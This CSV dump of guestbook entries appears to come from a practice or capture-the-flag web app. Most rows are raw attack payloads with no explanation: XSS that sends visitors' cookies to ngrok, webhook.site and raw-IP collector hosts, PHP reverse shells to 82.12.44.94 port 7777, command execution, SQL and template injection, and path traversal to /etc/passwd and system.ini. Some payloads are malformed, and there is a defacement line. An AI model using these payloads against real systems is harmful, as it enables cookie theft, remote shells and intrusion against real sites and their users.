id,name,entry
1,a,a
2,l,"<script>console.log(""Hey"")</script A"
3,abc,"<script>console.log(""Hey"")</script>"
4,dwdw,dwdw
5,mmm,<B>hmm</B>
6,{{2*2}},{{2*2}}
7,GIVE ME THE FLAG,GIVE ME THE FLAG
8,mmm,<B>hmm</B>
9,billy,<i>bob</i>
10,<img src=x onerror=this.src='http://563a-2409-4072-286-bae8-8bea-8b46-ca6b-1553.ngrok.io/?'+document.cookie;>,<img src=x onerror=this.src='http://563a-2409-4072-286-bae8-8bea-8b46-ca6b-1553.ngrok.io/?'+document.cookie;>
11,blah,blah
12,mmm,<?php%20phpinfo();>
13,test,"<script>console.log(""Hey"")</script>"
14,<blank>,{{2*2}}
15,a,{{constructor.constructor('alert(1)')()}}
16,a,<a href=[javascript&':alert(1)']>test</a>
17,','
18,"<script>fetch(""http://http://e0a5-2a02-2f0e-d319-0-2fbd-49af-411b-37e1.ngrok.io/?c=""+document.cookie)</script>","<script>fetch(""http://http://e0a5-2a02-2f0e-d319-0-2fbd-49af-411b-37e1.ngrok.io/?c=""+document.cookie)</script>"
19,a,"<a href=""http://http://e0a5-2a02-2f0e-d319-0-2fbd-49af-411b-37e1.ngrok.io/?c=""+document.cookie>test</a>"
20,a,"<img src=x onerror=this.src=""http://e0a5-2a02-2f0e-d319-0-2fbd-49af-411b-37e1.ngrok.io/?c=""+document.cookie;>"
21,ZAP,ZAP
22,ZAP,ZAP
23,ZAP,ZAP
24,ZAP,ZAP
25,ZAP,ZAP
26,ZAP,ZAP
27,ZAP,ZAP
28,ZAP,ZAP
29,ZAP,ZAP
30,ZAP,ZAP
31,ZAP,ZAP
32,../../../../../../../../../../../../../../../../Windows/system.ini,ZAP
33,/guestbook.php,ZAP
34,ZAP,/etc/passwd
35,hey,bululu
36,mmm,"<img src=x onerror=this.src=""http://350c-50-66-181-212.ngrok.io>/?c=""+document.cookie>"
37,test,test
38,mmm,<img src=x onerror=this.src='http://350c-50-66-181-212.ngrok.io>/?c='+document.cookie>
39,mmm,<img src=x onerror=this.src='http://350c-50-66-181-212.ngrok.io>/?c='+document.cookie>
40,mmm,<img src=x onerror=this.src='http://350c-50-66-181-212.ngrok.io/?c='+document.cookie>
41,</noscript>,hey
42,1' + sleep(10),1' + sleep(10)
43,' 1=1 --,' 1=1 --
44,</noscript><script>alert(3)</script>,hey
45,test,test
46,test,test
47,/guestbook.php,/guestbook.php
48,<img src=x onerror=this.src='http://350c-50-66-181-212.ngrok.io>/?c='+document.cookie>,<img src=x onerror=this.src='http://350c-50-66-181-212.ngrok.io>/?c='+document.cookie>
49,</noscript><script>alert(3)</script>,</noscript><script>alert(3)</script>
50,{{2*2}},{{2*2}}
51,{{2*2}},{{2*2}}
52,</noscript><script>alert(3)</script>,</noscript><script>alert(4)</script>
53,\\\\\\\\,\\\\\\\\
54,test,test
55,</noscript><script>alert(3)</script,</noscript><script>alert(3)</script
56,mmm,<img src=x onerror=this.src='http://350c-50-66-181-212.ngrok.io/?c='<?php phpinfo();?>>
57,mmm,<img src=x onerror=this.src='http://350c-50-66-181-212.ngrok.io/?c='+/windows/system.i
58,mmm,<img src=x onerror=this.src='http://350c-50-66-181-212.ngrok.io/?c=' + fetch(/windows/system.i)>
59,a,"<img src=x onerror=this.src=""http://e0a5-2a02-2f0e-d319-0-2fbd-49af-411b-37e1.ngrok.io/?c=""<?php phpinfo();?>>"
60,a,"<img src=x onerror=this.src=""http://e0a5-2a02-2f0e-d319-0-2fbd-49af-411b-37e1.ngrok.io/?c=""<?php phpinfo();?>>"
61,a,document.getElementsByTagName(â\x80\x9ch2â\x80\x9d)[2].innerHTML = â\x80\x9cPentested by @int0x33â\x80\x9d;
62,tes,tes
63,system,ls
64,tes,tes
65,mmm,<iframe src=/Windows/system.i/>
66,mmm,<iframe src=/Windows/system.i>
67,mmm,<iframe src=/etc/passwd>
68,mmm,<iframe src=/login.php>
69,mmm,"<?php echo file_get_contents(""login.php""); ?>"
70,bcngGCN,HCV
71,bcngGCN,{{ls -la}}
72,{{2*2}},{{2*2}}
73,{{2*2}},{{2*2}}
74,mmm,"<?php system(""whoami""); ?>"
75,mmm,"<?php system(""whoami""); ?>"
76,aa,bbbb
77,z,"<img src=""x"" onerror=""document.write(window.location)"" />"
78,asdas,/login.php
79,z,"<img src=""xasdasdasd"" onerror=""document.write(\\'<iframe src=file:///etc/passwd></iframe>\\')""/>"
80,z,"<img src=""xasdasdasd"" onerror=""document.write(\\'<iframe src=file:///etc/passwd></iframe>\\')""/>"
81,z,"<img src=""xasdasdasd"" onerror=""document.write(\\'<iframe src=file:///etc/passwd></iframe>\\')""/>"
82,z,"<img src=""xasdasdasd"" onerror=""document.write(\\'<iframe src=file:///etc/passwd></iframe>\\')""/>"
83,z,"<img src=""xasdasdasd"" onerror=""document.write(\\'<iframe src=file:///etc/passwd></iframe>\\')""/>"
84,z,"<img src=""xasdasdasd"" onerror=""document.write(\\'<iframe src=file:///login.php></iframe>\\')""/>"
85,"<img src=x onerror=this.src=""https://webhook.site/4881fad2-f1a7-4af7-95b9-9f37a4e9bf5b/?c=""+document.cookie;> ","<img src=x onerror=this.src=""https://webhook.site/4881fad2-f1a7-4af7-95b9-9f37a4e9bf5b/?c=""+document.cookie;> "
86,"<img src=""xasdasdasd"" onerror=""document.write(\\'<iframe src=file:///login.php></iframe>\\')""/>","<img src=""xasdasdasd"" onerror=""document.write(\\'<iframe src=file:///login.php></iframe>\\')""/>"
87,a,a
88,'; -- ,hello
89,a,test
90,a,test
91,'; --,'; --
92,xy,'; --
93,xy,"<img src=x onerror=this.src=""https://webhook.site/4881fad2-f1a7-4af7-95b9-9f37a4e9bf5b/?c=""+document.cookie;> "
94, 1' + sleep(10), 1' + sleep(10)
95, 1' + sleep(10), 1' + sleep(10)
96, 1' + sleep(10), 1' + sleep(10)
97,bruh,"<?php system(""whoami""); ?>"
98,bruh,<?php var_dump(phpinfo()); ?>
99,test,<?php phpinfo(); ?>
100,test,<?php phpinfo(); ?>
101,test,<?php phpinfo(); ?>
102,test,{{2*2}}
103,test,<B>hmm</B>
104,test,<?php phpinfo();>
105,test,<?php echo'hello';>
106,test,?php echo'hello';
107,test,<?php echo'hello';
108,test,<?php echo'hello';>
109,test,"<?php echo file_get_contents(""login.php""); ?>"
110,test,"<?php echo ""bru""; ?>hi"
111,a,<?php phpinfo(); ?>
112,test,"<?php exec(""/bin/bash -c \\'bash -i > /dev/tcp/82.12.44.94/7777 0>"
113,test,<?php phpinfo(); ?>
114,test,"<?php exec(""/bin/bash -c \\'bash -i \\\\> /dev/tcp/82.12.44.94/7777 0\\\\>"
115,test,<?php exec('/bin/bash -c 'bash -i \\\\> /dev/tcp/82.12.44.94/7777 0\\\\>
116,test,<?php exec('/bin/bash -c 'bash -i > /dev/tcp/82.12.44.94/7777 0>
117,test,"<?php $sock=fsockopen(""82.12.44.94"",7777);passthru(""/bin/sh -i <"
118,test,"<?php $sock=fsockopen(""82.12.44.94"",7777); >hi"
119,test,"<?php $sock=fsockopen(""82.12.44.94"",7777); >hi"
120,'+user()+','+user()+'
121,test,'+user()+'
122,test,{{7*7}}
123,test,<script>fetch('http://46.137.44.41:8000?x='+document.cookie)</script>
124,<script>fetch('http://46.137.44.41:8000?x='+document.cookie)</script>,test
125,test,<?php phpinfo();>
126,test,<?php phpinfo();?>
127,a,a
128,<img src=https://webhook.site/4a31ba07-11be-4fb5-be32-3b5138d56b99>,<img src=https://webhook.site/4a31ba07-11be-4fb5-be32-3b5138d56b99>
129,<img src=https://webhook.site/4a31ba07-11be-4fb5-be32-3b5138d56b99>,test
130,test,<img src=https://webhook.site/4a31ba07-11be-4fb5-be32-3b5138d56b99?webhook>
131,test,"<img src=""https://webhook.site/4a31ba07-11be-4fb5-be32-3b5138d56b99?test"">"
132,test,"<img src=""xasdasdasd"" onerror=""document.write(\\'<iframe src=file:///login.php></iframe>\\')""/>"
133,{{2*2}},{{2*2}}
134,a,"<img src=""https://webhook.site/23625f3f-c9e2-4ab9-89eb-2e187bcce7cb"">"
135,"<img src=""c107-213-134-179-47.ngrok.io/?cookie=\\' + document.cookie + \\'"" />","<img src=""c107-213-134-179-47.ngrok.io/?cookie=\\' + document.cookie + \\'"" />"
136,"<img src=""http://c107-213-134-179-47.ngrok.io/?cookie=\\' + document.cookie + \\'"" />","<img src=""http://c107-213-134-179-47.ngrok.io/?cookie=\\' + document.cookie + \\'"" />"
137,<?php phpinfo();?>,<?php phpinfo();?>
138,<script>test</script>,<script>test</script>
139,"<script type=""text/javascript"">document.location=""http://21ae-213-134-179-47.ngrok.io/?c=""+document.cookie;</script>","<script type=""text/javascript"">document.location=""http://21ae-213-134-179-47.ngrok.io/?c=""+document.cookie;</script>"
140,fd,fd
141,<?php phpinfo();?>,<?php phpinfo();?>
142,sadasd,dasdasd
143,1' + sleep(10),1' + sleep(10)
144,"<?php system(""whoami""); ?>","<?php system(""whoami""); ?>"
145,<?php exec('/bin/bash -c 'bash -i > /dev/tcp/82.12.44.94/7777 0>,<?php exec('/bin/bash -c 'bash -i > /dev/tcp/82.12.44.94/7777 0>
146,a,{{2*2}}
147,fds,{{2*2}}
148,fds,"<script>console.log(""Hey"")</script>"
149,a,<script>alert(1)</script>
150,a,<script><?php echo phpinfo();?></script>
151,a,<script><?php $GET['login.php];?></script>
152,a,<script><?php $_GET[*];?></script>
153,a,{{7*'7'}}
154,a,{{dump(app)}}
